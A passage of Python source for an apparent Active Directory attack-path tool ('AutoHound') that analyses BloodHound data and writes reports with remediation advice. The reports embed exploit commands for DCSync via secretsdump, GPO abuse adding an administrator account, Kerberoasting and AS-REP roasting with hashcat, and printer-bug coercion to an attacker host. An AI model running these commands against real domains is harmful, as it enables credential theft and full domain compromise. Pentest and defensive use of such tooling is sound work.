        entry["alt_paths"], entry["alt_capped"] = cnt, capped
    for entry in f["admin_chains"]:
        cnt, capped = g.count_paths(entry["start_id"], admin_groups, admin_dist)
        entry["alt_paths"], entry["alt_capped"] = cnt, capped

    # 8. Self-verification: re-walk every reported path against the raw edge set
    # edges_set stores (src, dst, etype)
    def verify2(entries, targets):
        ok = 0
        for e in entries:
            good = all((a, b, et) in g.edges_set for a, et, b in e["path"])
            if good and e["path"][-1][2] in targets:
                ok += 1
        return ok
    f["verification"] = {
        "tier_zero_paths": f"{verify2(f['paths'], hv_set)}/{len(f['paths'])} verified against raw edges",
        "admin_chains": f"{verify2(f['admin_chains'], admin_groups)}/{len(f['admin_chains'])} verified against raw edges",
    }

    # 9. Data quality / collector completeness (accuracy depends on the input!)
    type_counts = collections.Counter(n["type"] for n in g.nodes.values())
    edge_counts = collections.Counter(et for lst in g.edges.values() for _, et in lst)
    # Unresolved = referenced by an ACL but never collected as an object, so its
    # name is still its SID - whatever type the ACE claimed for it.
    unresolved = [n for n in g.nodes.values() if n["name"] == n["id"]]
    foreign_prefixes = collections.Counter()
    for n in unresolved:
        parts = n["id"].rsplit("-", 1)
        foreign_prefixes[parts[0] if len(parts) == 2 else n["id"]] += 1
    users = [n for n in g.nodes.values() if n["type"] == "User"]
    hv_group_ids = {nid for nid in hv if g.nodes[nid]["type"] == "Group"}
    anomalies = []
    for n in users:
        if get(n["properties"], "admincount") and not n["name"].upper().startswith("KRBTGT@"):
            # KRBTGT always has admincount=1 and is in no group - expected, not an anomaly.
            groups_of = {d for d, et in g.edges.get(n["id"], []) if et == "MemberOf"}
            if not (groups_of & hv_group_ids):
                anomalies.append(n["name"])
    roster = {}
    for gid in sorted(hv_group_ids):
        members = [g.nodes[s]["name"] for s, lst in g.edges.items()
                   for d, et in lst if d == gid and et == "MemberOf" and known(g, s)]
        if members:
            roster[g.nodes[gid]["name"]] = sorted(members)
    f["data_quality"] = {
        "node_types": dict(type_counts), "top_edge_types": edge_counts.most_common(12),
        "unresolved_principals": len(unresolved),
        "unresolved_by_sid_prefix": dict(foreign_prefixes),
        "session_edges": edge_counts.get("HasSession", 0),
        "disabled_users": sum(1 for n in users if get(n["properties"], "enabled") is False),
        "pwd_never_expires": sum(1 for n in users if get(n["properties"], "pwdneverexpires")),
        "password_not_required": sum(1 for n in users if get(n["properties"], "passwordnotreqd")),
        "computers_with_laps": sum(1 for n in g.nodes.values()
                                    if n["type"] == "Computer" and get(n["properties"], "haslaps")),
        "admincount_without_hv_group": sorted(anomalies)[:50],
        "tier_zero_roster": roster,
        "dc_name": next((n["name"] for n in g.nodes.values() if n.get("dc")), "<DC not identified>"),
    }

    # 10. Remediation, generated from the actual findings
    rem = []
    if f["admin_chains"]:
        top = max(f["admin_chains"], key=lambda x: x["shared_by"])
        if top["shared_by"] > 50:
            rem.append(f"CRITICAL: break the mass chain to {top['target']} (shared by {top['shared_by']} principals): "
                       f"review every step of `{render_path(g, top['path'])}` - remove broad group write access and scope helpdesk password-reset rights to only the OUs that need them.")
    if f["gpo_abuse"]:
        rem.append("Remove write access to linked GPOs from non-admin service accounts ("
                   + ", ".join(sorted({x['source'] for x in f['gpo_abuse']})) + "); audit GPO owners/editors.")
    if f["kerberoastable"]:
        rem.append("Kerberoastable accounts (" + ", ".join(k['name'] for k in f['kerberoastable'])
                   + "): use long random service-account passwords or gMSA, and remove SPNs that are not needed.")
    if f["asrep"]:
        rem.append("Enable Kerberos pre-authentication on: " + ", ".join(a['name'] for a in f['asrep']) + ".")
    if any(not d["source_is_hv"] for d in f["dcsync"]):
        rem.append("Remove DCSync rights from non-admin principals immediately - this is full domain compromise.")
    if f["data_quality"]["session_edges"] == 0:
        rem.append("Re-collect with session enumeration (SharpHound -c All from a privileged context): this collection has ZERO sessions, so HasSession paths are invisible - absence here is a collection gap, not proof they do not exist.")
    if anomalies:
        rem.append("Review admincount=1 accounts that are not in any Tier-Zero group (possible stale/orphaned admin flags): "
                   + ", ".join(sorted(anomalies)[:10]) + ".")
    f["remediation"] = rem
    return f

def write_reports(g, f, outdir, include_dashboard=True):
    outdir = Path(outdir); outdir.mkdir(parents=True, exist_ok=True)
    ctx = exploit_context(g)
    dc_name = f.get("data_quality", {}).get("dc_name", "<DC>")
    def dump(paths):
        return [{**p, "rendered": render_path(g, p["path"]),
                 "exploit_steps": exploit_steps_for_path(g, ctx, p["path"]),
                 "abuse_steps": [abuse_step(g, a, e, b, dc_name) for a, e, b in p["path"]],
                 "path": [{"from": g.nodes[a]["name"], "edge": e, "to": g.nodes[b]["name"]} for a, e, b in p["path"]]}
                for p in paths]
    jout = dict(f); jout["paths"] = dump(f["paths"]); jout["admin_chains"] = dump(f["admin_chains"])
    (outdir / "report.json").write_text(json.dumps(jout, indent=2), encoding="utf-8")

    dq = f.get("data_quality", {}); ver = f.get("verification", {})
    L = ["# AutoHound v1.4 Report - Automatic Privilege Escalation Paths", "",
         f"**Nodes:** {f['stats']['nodes']} | **Edges:** {f['stats']['edges']} | **High-value targets:** {f['stats']['highvalue_nodes']}",
         f"**Self-verification:** Tier-Zero paths {ver.get('tier_zero_paths','?')} | Admin chains {ver.get('admin_chains','?')} (every reported path was re-walked against the raw edges)", "",
         "## Executive Summary", "",
         f"- Paths from a non-admin principal to Tier-Zero: **{len(f['paths'])}**",
         f"- Privilege chains to Tier 1/Tier 2/server admin groups: **{len(f['admin_chains'])}** distinct chains"
         + (f" (largest shared by **{max((p['shared_by'] for p in f['admin_chains']), default=0)}** principals)" if f['admin_chains'] else ""),
         f"- DCSync-capable principals: **{len(f['dcsync'])}** ({sum(1 for d in f['dcsync'] if not d['source_is_hv'])} not already high-value)",
         f"- GPO abuse by non-privileged principals: **{len(f['gpo_abuse'])}** | Kerberoastable: **{len(f['kerberoastable'])}** | AS-REP roastable: **{len(f['asrep'])}**",
         f"- Data quality: **{dq.get('session_edges', 0)}** session edges collected, **{dq.get('unresolved_principals', 0)}** unresolved/foreign principals (see Data Quality section - this bounds the accuracy of everything above)", ""]
    L += ["## 🔴 Shortest Paths to Domain Admin / Tier-Zero (auto-found, shortest first)", ""]
    if not f["paths"]: L.append("No path found in this data.")
    for i, p in enumerate(f["paths"][:100], 1):
        L.append(f"### {i}. {p['start']}  →  {p['target']}  ({p['length']} hops, confidence {p.get('confidence','?')}%, alternative near-shortest paths: {p.get('alt_paths','?')}{'+' if p.get('alt_capped') else ''})")
        L.append(f"`{render_path(g, p['path'])}`")
        L.append("**Exploit steps** (replace `<YOUR_USER>` / `<PASS>` / `<NEW_PASSWORD>` with your own; lab use only):")
        for j, s in enumerate(exploit_steps_for_path(g, ctx, p["path"]), 1):
            L.append(f"{j}. **{s['from']} --[{s['edge']}]--> {s['to']}** (as `{s['actor']}`): {s['note']}")
            for c in s["commands"]:
                L.append(f"   ```\n   {c}\n   ```")
        L.append("")
    L += ["## 🟠 Privilege Chains to Admin Groups (Tier 1 / Tier 2 / Server Admins - not DA, still server/workstation admin)", ""]
    if not f["admin_chains"]: L.append("None found.")
    for i, p in enumerate(f["admin_chains"][:30], 1):
        L.append(f"### {i}. {p['start']}  →  {p['target']}  ({p['length']} hops, confidence {p.get('confidence','?')}%, chain shared by {p['shared_by']} principals, alternative near-shortest paths: {p.get('alt_paths','?')}{'+' if p.get('alt_capped') else ''})")
        L.append(f"`{render_path(g, p['path'])}`")
        L.append("**Exploit steps** (replace `<YOUR_USER>` / `<PASS>` / `<NEW_PASSWORD>` with your own; lab use only):")
        for j, s in enumerate(exploit_steps_for_path(g, ctx, p["path"]), 1):
            L.append(f"{j}. **{s['from']} --[{s['edge']}]--> {s['to']}** (as `{s['actor']}`): {s['note']}")
            for c in s["commands"]:
                L.append(f"   ```\n   {c}\n   ```")
        L.append("")
    L += ["## 🔴 DCSync-capable principals", ""]
    L += [f"- **{d['source']}** ({', '.join(d['rights'])} on the domain)" + (" [already high-value]" if d["source_is_hv"] else " **[NOT high-value - ESCALATION]**") for d in f["dcsync"]] or ["None found."]
    if f["dcsync"]:
        ssam, _ = split_principal(f["dcsync"][0]["source"])
        L += ["", f"Exploit (as a DCSync-capable account, replace `<PASS>`):",
              f"```\nsecretsdump.py {ctx[0]}/{ssam}:'<PASS>'@{ctx[1]} -just-dc\n```"]
    L += ["", "## 🟠 GPO Abuse (write on a GPO linked to computers)", ""]
    L += [f"- **{x['source']}** --[{x['right']}]--> GPO **{x['gpo']}** → computers: {', '.join(x['computers'])}" for x in f["gpo_abuse"]] or ["None found by non-privileged principals."]
    if f["gpo_abuse"]:
        x0 = f["gpo_abuse"][0]; gsam, _ = split_principal(x0["gpo"])
        L += ["", f"Exploit (as `{x0['source']}`, first use its `{x0['right']}` right on the GPO if needed, then):",
              f"```\nSharpGPOAbuse.exe --AddComputerTask --TaskName \"AutoHound\" --Author {ctx[0]}\\<YOUR_USER> --Command \"cmd.exe /c net user autohound <NEW_PASSWORD> /add & net localgroup administrators autohound /add\" --GPOName \"{gsam}\"\n```"]
    L += ["", "## 🟠 Kerberoastable (hasspn=True)", ""]
    L += [f"- {k['name']}  SPNs: {k['spns']}" for k in f["kerberoastable"]] or ["None found."]
    if f["kerberoastable"]:
        ksam, _ = split_principal(f["kerberoastable"][0]["name"])
        L += ["", "Exploit (any authenticated user, replace `<YOUR_USER>` / `<PASS>`):",
              f"```\nGetUserSPNs.py {ctx[0]}/<YOUR_USER>:'<PASS>' -dc-ip {ctx[1]} -request-user {ksam}\nhashcat -m 13100 <HASH_FILE> <WORDLIST>\n```"]
    L += ["", "## 🟠 AS-REP Roastable (dontreqpreauth=True)", ""]
    L += [f"- {a['name']}" for a in f["asrep"]] or ["None found."]
    if f["asrep"]:
        asam, _ = split_principal(f["asrep"][0]["name"])
        L += ["", "Exploit (no credentials needed for the roast itself):",
              f"```\nGetNPUsers.py {ctx[0]}/ -usersfile <FILE_WITH_{asam}> -no-pass -dc-ip {ctx[1]}\nhashcat -m 18200 <HASH_FILE> <WORDLIST>\n```"]
    L += ["", "## 🟠 Unconstrained Delegation (non-DC computers)", ""]
    L += [f"- {u['name']}" for u in f["unconstrained"]] or ["None found."]
    if f["unconstrained"]:
        ushort = f["unconstrained"][0]["name"].split(".")[0]
        L += ["", "Exploit (coerce a privileged account to authenticate to it, then steal its TGT):",
              f"```\nprinterbug.py {ctx[0]}/<YOUR_USER>:'<PASS>'@{ushort} <ATTACKER_HOST>\nRubeus.exe monitor /interval:5 /filteruser:<TARGET_ADMIN>\n```"]
    L += ["", "## 🟡 Dangerous ACLs (grouped by source + right)", ""]
    for d in f["dangerous_acls"][:60]:
        samples = d["hv_samples"] or d["samples"]
        L.append(f"- **{d['source']}** --[{d['right']}]--> {d['targets']} objects"
                 + (f", {d['hv_targets']} of them HIGH-VALUE" if d["hv_targets"] else "")
                 + (f"  e.g. {', '.join(samples)}" if samples else "")
                 + ("  [source already high-value]" if d["source_is_hv"] else ""))
    if not f["dangerous_acls"]: L.append("None found.")
    L += ["", "## 🔍 Data Quality, Accuracy & Collector Completeness", "",
          f"- Node types: {dq.get('node_types')}",
          f"- Top edge types: {dq.get('top_edge_types')}",
          f"- Session edges collected: **{dq.get('session_edges', 0)}**" + ("  ⚠️ ZERO sessions - HasSession attack paths are INVISIBLE in this collection. This is a collection gap (SharpHound needs the right collection method + privileges), not evidence that no such paths exist." if dq.get('session_edges', 0) == 0 else ""),
          f"- Unresolved / foreign principals (principals referenced by ACLs but not collected as objects): **{dq.get('unresolved_principals', 0)}**, grouped by SID prefix: {dq.get('unresolved_by_sid_prefix')} - these are usually built-in SIDs or a trusted parent/forest domain; paths are never STARTED from them.",
          f"- Disabled user accounts: {dq.get('disabled_users')} (excluded as path starting points) | pwdneverexpires: {dq.get('pwd_never_expires')} | passwordnotreqd: {dq.get('password_not_required')}",
          f"- Computers with LAPS: {dq.get('computers_with_laps')}",
          f"- Domain Controller identified: **{dq.get('dc_name')}**",
          f"- admincount=1 accounts NOT in any Tier-Zero group (stale admin flags or hidden admins - review): {', '.join(dq.get('admincount_without_hv_group', [])[:20]) or 'none'}",
          "", "**Tier-Zero group roster (direct members, as collected):**"]
    for gname, members in (dq.get("tier_zero_roster") or {}).items():
        L.append(f"- {gname}: {len(members)} members - {', '.join(members[:12])}" + (" …" if len(members) > 12 else ""))
    L += ["", "## 🛡️ Remediation (generated from these findings)", ""]
    L += [f"- {r}" for r in f.get("remediation", [])] or ["- No specific remediation generated."]
    L += ["", "---", "*AutoHound v1.4 - for authorized labs / pentests only. Verify each path manually before exploiting. "
          "Missing sessions/LAPS edges usually mean the collector did not have rights to read them, not that they don't exist.*"]
    (outdir / "report.md").write_text("\n".join(L), encoding="utf-8")
    dash = None
    if include_dashboard:
        try:
            from dashboard import render_dashboard
            dash = render_dashboard(build_dashboard_data(g, f), outdir / "dashboard.html")
        except Exception as e:
            print(f"[!] dashboard generation failed: {e}", file=sys.stderr)
    return outdir / "report.md", outdir / "report.json", dash

def build_dashboard_data(g, f):
    ctx = exploit_context(g)
    def short(name, ntype):
        if "@" in name: return name.rsplit("@", 1)[0]
        if ntype == "Computer" and "." in name: return name.split(".", 1)[0]
        return name
    def payload(entry, kind):
        ids = [entry["path"][0][0]] + [b for _, _, b in entry["path"]]
        return {"kind": kind, "start": entry["start"], "target": entry["target"],
                "length": entry["length"], "confidence": entry.get("confidence"),
                "shared_by": entry.get("shared_by", 1),
                "alt_paths": entry.get("alt_paths"), "rendered": render_path(g, entry["path"]),
                "nodes": [{"name": g.nodes[i]["name"], "short": short(g.nodes[i]["name"], g.nodes[i]["type"]),
                           "type": g.nodes[i]["type"], "hv": g.is_highvalue(i)} for i in ids],
                "edges": [e for _, e, _ in entry["path"]],
                "steps": exploit_steps_for_path(g, ctx, entry["path"])}
    domain = next((n["name"] for n in g.nodes.values() if n["type"] == "Domain"), "<DOMAIN>")
    ver = f.get("verification", {})
    # ---- Full-domain graph payload: NOT all 5k nodes (unreadable + huge).
    # Priority-score every node, keep the attack-relevant universe: Tier-Zero,
    # everything on a found path, all groups/computers/GPOs/the domain, members
    # of privileged groups, and sources/targets of dangerous ACLs. Edges are
    # kept only between kept nodes and only for attack-relevant types.
    path_node_ids = set()
    for p in f["paths"] + f["admin_chains"]:
        path_node_ids.add(p["path"][0][0])
        path_node_ids.update(b for _, _, b in p["path"])
    danger_ids = set()
    # names of dangerous-ACL sources are in the grouped report; map back to ids
    name_to_id = {n["name"]: nid for nid, n in g.nodes.items()}
    for d in f["dangerous_acls"]:
        if d["source"] in name_to_id: danger_ids.add(name_to_id[d["source"]])
        for sname in d.get("hv_samples", []):
            if sname in name_to_id: danger_ids.add(name_to_id[sname])
    roster_ids = set()
    for members in (f["data_quality"].get("tier_zero_roster") or {}).values():
        for m in members:
            if m in name_to_id: roster_ids.add(name_to_id[m])
    # Members of the admin-chain target groups (Tier 1 / Tier 2 / Server Admins…)
    admin_member_ids = set()
    admin_target_ids = {name_to_id[p["target"]] for p in f["admin_chains"] if p["target"] in name_to_id}
    for s, lst in g.edges.items():
        for d, et in lst:
            if et == "MemberOf" and d in admin_target_ids:
                admin_member_ids.add(s)
    KEEP_TYPES = {"Group", "Computer", "Domain", "GPO"}
    EDGE_TYPES = {"MemberOf", "AdminTo", "CanRDP", "CanPSRemote", "ExecuteDCOM", "HasSession",
                  "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns",
                  "ForceChangePassword", "AddMember", "AddSelf", "AddKeyCredentialLink",
                  "WriteSPN", "AllExtendedRights", "GetChanges", "GetChangesAll",
                  "GPLink", "AllowedToDelegate", "AllowedToAct"}
    def score(nid):
        n = g.nodes[nid]; s = 0
        if g.is_highvalue(nid): s += 100
        if nid in path_node_ids: s += 80
        if nid in danger_ids: s += 50
        if nid in roster_ids: s += 40
        if nid in admin_member_ids: s += 35
        if n["type"] == "Computer": s += 60
        if n["type"] == "Domain": s += 90
        if n["type"] == "GPO": s += 45
        if n["type"] == "Group": s += 30
        s += min(20, len(g.edges.get(nid, [])) // 50)
        return s
    cand = []
    for nid, n in g.nodes.items():
        if n["type"] in KEEP_TYPES or nid in path_node_ids or nid in danger_ids or nid in roster_ids or nid in admin_member_ids:
            cand.append(nid)
    cand.sort(key=score, reverse=True)
    cand = cand[:600]
    cand_set = set(cand)
    indeg = collections.Counter()
    for lst in g.edges.values():
        for d, _ in lst:
            indeg[d] += 1
    fg_edges, seen_e = [], set()
    for s in cand:
        for d, et in g.edges.get(s, []):
            if d in cand_set and et in EDGE_TYPES and (s, d, et) not in seen_e:
                seen_e.add((s, d, et))
                fg_edges.append({"s": s, "t": d, "e": et})
    fg_edges = fg_edges[:5000]
    fullgraph = {
        "total_nodes": len(g.nodes), "total_edges": len(g.edges_set),
        "nodes": [{"id": nid, "name": g.nodes[nid]["name"],
                   "short": short(g.nodes[nid]["name"], g.nodes[nid]["type"]),
                   "type": g.nodes[nid]["type"], "hv": g.is_highvalue(nid),
                   "score": score(nid),
                   "out": len(g.edges.get(nid, [])),
                   "in": indeg.get(nid, 0)}
                  for nid in cand],
        "edges": fg_edges}
    # ---- "Checked - no full path" -------------------------------------------
    # Accounts with SOME power that does not reach Tier-Zero / an admin group
    # in this data (dead-end local admins, partial DCSync, roastable accounts).
    # Without this list they look "missing" from a paths-only dashboard.
    path_starts = {p["start"] for p in f["paths"] + f["admin_chains"]}
    asrep_names = {a["name"] for a in f["asrep"]}
    kerb_map = {k["name"]: (k["spns"] if isinstance(k["spns"], str) else ", ".join(k["spns"])) for k in f["kerberoastable"]}
    checked = []
    for nid, n in g.nodes.items():
        if n["type"] != "User" or g.is_highvalue(nid) or n["name"] in path_starts:
            continue
        if (n.get("properties") or {}).get("enabled") is False:
            continue
        outs = g.edges.get(nid, [])
        if any(et == "MemberOf" and g.is_highvalue(d) for d, et in outs):
            continue
        reasons = []
        rights = {et for _, et in outs if et in ("GetChanges", "GetChangesAll")}
        if rights and rights != {"GetChanges", "GetChangesAll"}:
            reasons.append("Has only half of the DCSync rights (" + "/".join(sorted(rights)) + ") - not enough on its own")
        admins = sorted({short(g.nodes[d]["name"], g.nodes[d]["type"]) for d, et in outs if et == "AdminTo"})
        if admins:
            reasons.append("Local admin of " + ", ".join(admins[:4]) + " - but no onward path from those machines in this data")
        remote = sorted({short(g.nodes[d]["name"], g.nodes[d]["type"]) for d, et in outs if et in ("CanRDP", "CanPSRemote")})
        if remote:
            reasons.append("Can log on remotely to " + ", ".join(remote[:4]) + " (a foothold only - not admin)")
        if n["name"] in asrep_names:
            reasons.append("AS-REP roastable - anyone can ask for this account's password hash and crack it offline (an attack ON this account, not a path from it)")
        if n["name"] in kerb_map:
            reasons.append("Kerberoastable (SPN: " + kerb_map[n["name"]] + ") - its service ticket can be requested and cracked offline (see report.md)")
        if reasons:
            checked.append({"name": n["name"], "short": short(n["name"], "User"), "reasons": reasons})
    checked.sort(key=lambda c: (0 if any(r.startswith("Local admin") for r in c["reasons"]) else 1, c["short"]))
    checked = checked[:30]
    # Every enabled user account (short names) for the "I start from" selector:
    # accounts with no path must be selectable too, and then show "no path".
    users_list = sorted({short(n["name"], "User") for n in g.nodes.values()
                         if n["type"] == "User" and (n.get("properties") or {}).get("enabled") is not False})
    return {"domain": domain, "stats": f["stats"], "fullgraph": fullgraph, "checked": checked, "users": users_list,
            "verification_text": f"Tier-Zero {ver.get('tier_zero_paths','?')} · Admin chains {ver.get('admin_chains','?')}",
            "paths": [payload(p, "tier-zero") for p in f["paths"]] +
                     [payload(p, "admin-chain") for p in f["admin_chains"]],
            "dcsync": f["dcsync"], "gpo_abuse": f["gpo_abuse"],
            "kerberoastable": f["kerberoastable"], "asrep": f["asrep"],
            "unconstrained": f["unconstrained"],
            "dangerous_acls": f["dangerous_acls"][:40],
            "data_quality": f["data_quality"], "remediation": f["remediation"]}

def main():
    ap = argparse.ArgumentParser(description="AutoHound - automatic BloodHound path finder")
    ap.add_argument("--input", action="append", required=True, help="SharpHound .json / .zip / folder (repeatable)")
    ap.add_argument("--out", default="autohound_report", help="output folder")
    ap.add_argument("--separate", action="store_true",
                    help="treat EACH input as its own dataset/collection: one report folder per input plus ONE combined dashboard with a dataset switcher")
    ap.add_argument("--combine", action="store_true",
                    help="force merging all inputs into a single graph (legacy behaviour, e.g. users.json + groups.json of one collection)")
    args = ap.parse_args()
    # ---- Multi-dataset mode -------------------------------------------------
    # Multiple SharpHound .zip files are separate collections by definition,
    # so they are auto-separated; --separate forces this for any input type.
    zip_inputs = [i for i in args.input if str(i).lower().endswith(".zip")]
    separate = args.separate or (not args.combine and len(args.input) > 1 and len(zip_inputs) == len(args.input))
    if separate:
        from dashboard import render_dashboard
        outdir = Path(args.out); outdir.mkdir(parents=True, exist_ok=True)
        datasets, used = [], set()
        for inp in args.input:
            print(f"[*] Dataset: {inp}")
            g = build_graph([inp])
            print(f"[*] {len(g.nodes)} nodes, {len(g.edges_set)} edges")
            f = analyze(g)
            data = build_dashboard_data(g, f)
            data["label"] = f"{data.get('domain', 'Dataset')} - {Path(inp).name}"
            data["source"] = str(inp)
            datasets.append(data)
            stem = "".join(c if (c.isalnum() or c in "-_") else "_" for c in Path(inp).stem) or "dataset"
            base, n = stem, 2
            while stem in used:
                stem = f"{base}_{n}"; n += 1
            used.add(stem)
            md, js, _ = write_reports(g, f, outdir / stem, include_dashboard=False)
            print(f"[+] {data.get('domain')}: {len(f['paths'])} Tier-Zero path(s), {len(f['admin_chains'])} admin chain(s) -> {md}")
        dash = render_dashboard({"datasets": datasets}, outdir / "dashboard.html")
        print(f"[+] Combined dashboard for {len(datasets)} dataset(s): {dash}")
        print(f"[+] Open it and use the dataset switcher at the top right.")
        return
    print("[*] Building graph from JSON...")
    g = build_graph(args.input)
    print(f"[*] {len(g.nodes)} nodes, {len(g.edges_set)} edges")
    print("[*] Auto-finding ALL privilege escalation paths (single reverse-BFS, no queries)...")
    f = analyze(g)
    md, js, dash = write_reports(g, f, args.out)
    print(f"[+] Paths to Tier-Zero       : {len(f['paths'])}")
    print(f"[+] Chains to admin groups   : {len(f['admin_chains'])}")
    print(f"[+] DCSync-capable           : {len(f['dcsync'])}")
    print(f"[+] GPO abuse (non-priv)     : {len(f['gpo_abuse'])}")
    print(f"[+] Kerberoastable           : {len(f['kerberoastable'])}")
    print(f"[+] AS-REP Roastable         : {len(f['asrep'])}")
    print(f"[+] Verification           : {f.get('verification')}")
    print(f"[+] Session edges in data  : {f.get('data_quality', {}).get('session_edges')}")
    print(f"[+] Report: {md}")
    print(f"[+] Report: {js}")
    if dash: print(f"[+] Dashboard: {dash}")
    if f["paths"]:
        print("\n[ TOP SHORTEST PATHS TO TIER-ZERO ]")
        for p in f["paths"][:3]: print(" ", render_path(g, p["path"]))
    if f["admin_chains"]:
        print("\n[ TOP ADMIN-GROUP CHAINS ]")
        for p in f["admin_chains"][:3]: print(" ", render_path(g, p["path"]), f"(shared by {p['shared_by']})")

if __name__ == "__main__":
    main()
